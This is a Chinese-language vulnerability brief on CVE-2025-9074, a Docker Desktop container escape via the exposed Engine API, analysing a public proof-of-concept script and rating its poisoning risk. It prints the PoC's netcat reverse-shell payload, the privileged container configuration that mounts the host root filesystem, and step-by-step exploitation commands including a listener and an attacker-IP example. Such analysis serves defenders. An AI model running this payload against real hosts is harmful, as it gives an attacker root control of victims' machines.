## CVE-2025-9074 - Docker Desktop 容器逃逸/权限提升/远程代码执行(RCE)

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/权限提升/远程代码执行(RCE)

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** 影响Windows和macOS版本，版本低于4.44.3（在2025年8月20日修复）

**利用条件:** 需要本地运行的恶意Linux容器，或能够运行恶意容器的能力；Docker Engine HTTP API (192.168.65.7:2375) 可从容器内部访问；不依赖挂载Docker socket，也不受“Expose daemon”选项影响。

**POC 可用性:** 9

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 10%

## 详情

POC有效性分析：
该POC脚本`cve-2025-9074.sh`是针对CVE-2025-9074，即Docker Desktop容器逃逸漏洞的有效利用工具。此漏洞的根本原因在于，在受影响的Docker Desktop安装中，Docker Engine的HTTP API（通常监听在`http://192.168.65.7:2375`）意外地可从容器内部访问。该脚本首先通过向目标Docker API端点发送`GET /version`请求来验证API的可达性，这是确保后续攻击成功的关键前置步骤。一旦API可访问性得到确认，脚本便会精心构造并向Docker API的`/containers/create`端点提交一个JSON有效载荷。这个载荷是漏洞利用的核心，它旨在创建一个具有特定配置的新Docker容器，这些配置共同促成了容器的逃逸：
*   `"Image": "alpine:latest"`: 指定使用轻量级且广泛使用的Alpine Linux镜像，为执行漏洞利用命令提供了一个最小化的环境。
*   `"Cmd": ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"]`: 此命令数组定义了容器启动时要执行的操作。这是一个经典的`netcat`反弹shell载荷，旨在与攻击者控制的监听器（`${LHOST}:${LPORT}`）建立交互式shell会话。使用命名管道（`mkfifo`）确保了shell的稳定性和交互性。
*   `"HostConfig": {"Binds": ["/:/hostfs:rw"], "Privileged": true, "NetworkMode": "host"}`: `HostConfig`部分包含了实现容器逃逸的关键配置：
    *   `"Binds": ["/:/hostfs:rw"]`: 此参数指示Docker将宿主机的根文件系统（`/`）挂载到新容器的`/hostfs`路径下，并赋予完全的读写权限。这使得恶意容器可以直接、无限制地访问底层宿主机上的所有文件和目录。
    *   `"Privileged": true`: 将容器设置为“特权模式”，绕过了通常限制容器的几乎所有安全能力和隔离机制。这赋予了容器对宿主机资源（包括设备和内核功能）的广泛访问权限，使其权力几乎等同于宿主机上的root用户。
    *   `"NetworkMode": "host"`: 此配置强制容器共享宿主机的网络命名空间。这意味着容器直接使用宿主机的网络接口和IP地址，进一步削弱了网络隔离，简化了从容器内部进行的网络侦察或攻击。
成功创建容器并获取其ID后，脚本会向`/containers/${CID}/start`发送一个`POST`请求以启动容器。容器成功启动后，`Cmd`字段中嵌入的反弹shell命令就会执行，连接回攻击者的监听机器，从而使攻击者获得宿主机的root权限shell，实现完全控制。该POC的简洁性、清晰性以及对所述攻击向量的直接实现，使其成为CVE-2025-9074的一个健壮的概念验证。随附的`README.md`提供了所有必要的说明，包括设置`netcat`监听器的关键前置条件，使得该漏洞利用工具可用于授权测试。

利用步骤：
1.  **前提条件**: 攻击者已在运行Docker Desktop的Windows或macOS系统中的某个容器内部获得代码执行权限，或者能够通过某种方式在该系统上运行一个恶意Linux容器。受害者系统运行的是受影响的Docker Desktop版本（具体而言，版本低于在2025年8月20日发布并修复此漏洞的4.44.3版本）。同时，确保攻击者可从受控容器访问到Docker Engine API (`192.168.65.7:2375`)。
2.  **准备攻击机器**: 在攻击者的机器上（例如Kali Linux），启动一个`netcat`监听器，用于接收反弹shell。监听命令示例如：`nc -lvnp <listener_port>`，其中`<listener_port>`可以是如`4444`等任意未被占用的端口。例如：`nc -lvnp 4444`。
3.  **上传POC脚本**: 将此POC项目中的 `cve-2025-9074.sh` 脚本上传到已受控的容器内部。确保脚本具有执行权限（`chmod +x cve-2025-9074.sh`）。
4.  **执行POC**: 在容器内部执行上传的脚本。脚本需要四个参数：Docker API的IP地址、Docker API的端口、攻击者的IP地址和监听端口。默认情况下，Docker API的IP地址通常是`192.168.65.7`，端口是`2375`。
    执行命令示例如：`./cve-2025-9074.sh 192.168.65.7 2375 10.10.14.x 4444` (请将 `10.10.14.x` 替换为攻击者机器的实际IP地址，`4444`替换为监听端口)。
5.  **接收反弹Shell**: 脚本成功执行后，在攻击者的`netcat`监听器上将立即收到一个来自宿主机的反弹shell。此shell通常以root权限运行，意味着攻击者已完全控制宿主机系统。

投毒风险分析：
对该POC代码的投毒风险评估结果为低，具体百分比为10%。这一评估基于对POC脚本 (`cve-2025-9074.sh`) 及其相关文件的全面分析，结果显示该POC不包含任何恶意或可疑的投毒机制。
首先，**代码的透明度极高**。`cve-2025-9074.sh` 是一个纯粹的bash shell脚本，其所有操作逻辑都以明文形式呈现，没有任何形式的代码混淆。用户可以非常容易地阅读、理解并验证脚本的每一行代码，从而确保它只执行其宣称的功能。它主要通过`curl`工具与Docker API进行交互，并利用标准的`netcat`命令构造反弹shell。
其次，**脚本完全使用标准和可信的工具**。它依赖于操作系统或Docker环境中普遍存在的`curl`和`netcat`（或busybox内置的`nc`）等命令行工具。这些工具的行为是众所周知的，且在安全社区中经过了广泛的审查。脚本没有引入任何未知的、专有的或可疑的二进制文件。此外，它使用`alpine:latest`作为基础Docker镜像来创建容器，`alpine`是一个官方且高度信任的轻量级Linux发行版，其行为是可预测的，不会引入额外的风险。
再者，**POC的意图非常明确且单一**。脚本的核心功能是构建一个JSON有效载荷，通过Docker API创建一个具有特定参数（如绑定宿主机根目录、特权模式和主机网络模式）的容器，并在此容器中执行一个反弹shell。所有这些步骤都直接、清晰地服务于演示Docker Desktop容器逃逸这一漏洞。没有发现任何迹象表明脚本试图执行与漏洞利用无关的其他恶意操作，例如数据窃取、持久化后门、感染其他系统或进行加密货币挖矿等。
最后，**项目包含了明确的法律免责声明**。在`README.md`文件中，作者明确指出该POC仅用于教育和授权的安全测试目的，并强调未经授权的利用是非法且不道德的。这表明作者的初衷是用于防御性研究和合法测试，而非恶意传播。
综上所述，该POC代码在结构、逻辑和依赖上都表现出高度的透明度和安全性。它是一个典型的、用于漏洞验证的概念验证工具，不携带任何投毒风险。使用者在运行前仍应仔细检查脚本，并确保在受控的、拥有明确授权的环境中进行测试，以防止意外后果。

**项目地址:** https://github.com/zenzue/CVE-2025-9074

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074
